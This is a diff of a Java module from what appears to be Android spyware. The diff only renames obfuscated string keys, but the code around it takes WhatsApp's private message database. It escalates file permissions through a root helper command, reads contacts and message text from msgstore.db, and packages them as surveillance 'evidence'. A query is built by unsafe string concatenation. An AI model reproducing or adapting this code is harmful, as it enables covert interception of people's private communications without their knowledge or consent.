@@ -119,13 +119,13 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 		}
 		boolean updateMarkup = false;
 		// f.0=/data/data/com.whatsapp/databases
-		String dbDir = Messages.getString("f.0");
+		String dbDir = Messages.getString("f_0");
 		// f.1=/msgstore.db
-		String dbFile = dbDir + Messages.getString("f.1");
+		String dbFile = dbDir + Messages.getString("f_1");
 		// changeFilePermission(dbFile,777);
 		// f.2=/system/bin/ntpsvd pzm 777 
-		Runtime.getRuntime().exec(Messages.getString("f.2") + dbDir);
-		Runtime.getRuntime().exec(Messages.getString("f.2") + dbFile);
+		Runtime.getRuntime().exec(Messages.getString("f_2") + dbDir);
+		Runtime.getRuntime().exec(Messages.getString("f_2") + dbFile);
 		File file = new File(dbFile);
 		if (file.canRead()) {
 			if (Cfg.DEBUG) {
@@ -181,18 +181,18 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 
 		SQLiteQueryBuilder queryBuilderIndex = new SQLiteQueryBuilder();
 		// f.3=chat_list
-		queryBuilderIndex.setTables(Messages.getString("f.3"));
+		queryBuilderIndex.setTables(Messages.getString("f_3"));
 		// queryBuilder.appendWhere(inWhere);
 		// f.4=_id
 		// f.5=key_remote_jid
 		// f.6=message_table_id
-		String[] projection = { Messages.getString("f.4"), Messages.getString("f.5"), Messages.getString("f.6") };
+		String[] projection = { Messages.getString("f_4"), Messages.getString("f_5"), Messages.getString("f_6") };
 		Cursor cursor = queryBuilderIndex.query(db, projection, null, null, null, null, null);
 
 		// iterate conversation indexes
 		while (cursor != null && cursor.moveToNext()) {
-			String jid = cursor.getString(cursor.getColumnIndexOrThrow(Messages.getString("f.5")));
-			int mid = cursor.getInt(cursor.getColumnIndexOrThrow(Messages.getString("f.6")));
+			String jid = cursor.getString(cursor.getColumnIndexOrThrow(Messages.getString("f_5")));
+			int mid = cursor.getInt(cursor.getColumnIndexOrThrow(Messages.getString("f_6")));
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (readChatMessages): jid : " + jid + " mid : " + mid);
 			}
@@ -224,16 +224,16 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 		}
 		SQLiteQueryBuilder queryBuilderIndex = new SQLiteQueryBuilder();
 		// f.a=messages
-		queryBuilderIndex.setTables(Messages.getString("f.a"));
-		queryBuilderIndex.appendWhere(Messages.getString("f.5")+" = '" + conversation + "' AND "+ Messages.getString("f.4") +" > " + lastReadIndex);
+		queryBuilderIndex.setTables(Messages.getString("f_a"));
+		queryBuilderIndex.appendWhere(Messages.getString("f_5")+" = '" + conversation + "' AND "+ Messages.getString("f_4") +" > " + lastReadIndex);
 		// f.7=data
-		String[] projection = { Messages.getString("f.4"), Messages.getString("f.5"), Messages.getString("f.7") };
+		String[] projection = { Messages.getString("f_4"), Messages.getString("f_5"), Messages.getString("f_7") };
 		Cursor cursor = queryBuilderIndex.query(db, projection, null, null, null, null, null);
 		ArrayList<String> messages = new ArrayList<String>();
 		int lastRead = lastReadIndex;
 		while (cursor != null && cursor.moveToNext()) {
-			String data = cursor.getString(cursor.getColumnIndexOrThrow(Messages.getString("f.7")));
-			int index = cursor.getInt(cursor.getColumnIndexOrThrow(Messages.getString("f.4")));
+			String data = cursor.getString(cursor.getColumnIndexOrThrow(Messages.getString("f_7")));
+			int index = cursor.getInt(cursor.getColumnIndexOrThrow(Messages.getString("f_4")));
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (fetchMessages): " + conversation + " : " + index + " -> " + data);
 			}
@@ -255,10 +255,10 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 
 			items.add(datetime.getStructTm());
 			// f.8=WhatsApp			
-			items.add(WChar.getBytes(Messages.getString("f.8"), true));
+			items.add(WChar.getBytes(Messages.getString("f_8"), true));
 			items.add(WChar.getBytes("", true));
 			// f.9=@s.whatsapp.net	
-			items.add(WChar.getBytes(conversation.replaceAll(Messages.getString("f.9"), ""), true));
+			items.add(WChar.getBytes(conversation.replaceAll(Messages.getString("f_9"), ""), true));
 			items.add(WChar.getBytes(message, true));
 			items.add(ByteArray.intToByteArray(EvidenceReference.E_DELIMITER));
 		}
